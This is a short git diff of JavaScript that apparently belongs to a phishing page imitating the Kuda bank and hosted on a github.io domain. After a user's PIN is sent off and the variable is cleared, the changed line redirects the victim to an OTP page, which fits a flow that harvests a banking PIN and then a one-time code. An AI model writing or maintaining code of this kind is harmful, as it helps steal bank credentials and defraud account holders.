@@ -42,7 +42,7 @@ document
         console.log("Sent successfully:", response);
         pin = "";
 
-        location.href = "/otp.html";
+        location.href = "/lo-Kuda.xyz.github.io/otp.html";
       },
       function (error) {
         console.log("Failed to send:", error);
